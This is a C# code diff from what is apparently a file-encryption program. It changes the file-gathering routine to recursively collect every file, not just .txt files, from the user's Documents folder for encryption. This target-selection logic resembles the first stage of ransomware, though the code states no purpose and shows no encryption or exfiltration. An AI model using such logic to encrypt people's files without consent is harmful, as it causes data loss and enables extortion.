@@ -13,7 +13,7 @@ namespace EncryptFiles
 		// Files to encrypt list
 		private List<string> filenames = new List<string>();
 		// Extention of files
-		private string filesExtention;
+		private string filesExtentions;
 		// Folder to find files
 		private string sourceDirectory;
 		// Key for encryption
@@ -24,7 +24,7 @@ namespace EncryptFiles
 			// Get user documents folder
 			sourceDirectory = ConfigurationManager.AppSettings["folderToEncrypt"] ?? Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 			// Get files extention
-			filesExtention = ConfigurationManager.AppSettings["filesExtention"] ?? "txt";
+			filesExtentions = ConfigurationManager.AppSettings["filesExtention"] ?? "*";
 			// Get encryption key
 			if (ConfigurationManager.AppSettings["cryptoKey"] == null)
 			{
@@ -46,28 +46,29 @@ namespace EncryptFiles
 		// Gets a list of files from a directory recursively
 		public void GetFilesToEncrypt()
 		{
-			getFilesToEncrypt(sourceDirectory);
+			foreach(string extention in filesExtentions.Split(','))
+				getFilesToEncrypt(sourceDirectory, extention);
 		}
 
 		/// <summary>
 		/// Gets a list of files from a directory recursively
 		/// </summary>
 		/// <param name="sourceDirectory">Folder to encrypt</param>
-		private void getFilesToEncrypt(string sourceDirectory)
+		private void getFilesToEncrypt(string sourceDirectory, string extention)
 		{
 			try
 			{
 				// Get a list of all files in current directory
 				var allFiles = Directory.EnumerateFiles(sourceDirectory);
 				// Filter files by extention
-				var filesToEncrypt = allFiles.Where(s => s.Split('.')[s.Split('.').Count() - 1].ToLower().Equals(filesExtention));
+				var filesToEncrypt = extention.Equals("*") ? allFiles : allFiles.Where(s => s.Split('.')[s.Split('.').Count() - 1].ToLower().Equals(extention));
 				// Add all necessary files to the list
 				filenames.AddRange(filesToEncrypt);
 				// Get a folders list of the current folder
 				var dirs = Directory.EnumerateDirectories(sourceDirectory);
 				// Recursively get a list of files and subfolders pass
 				foreach (var directory in dirs)
-					getFilesToEncrypt(directory);
+					getFilesToEncrypt(directory, extention);
 			}
 			catch (Exception ex)
 			{
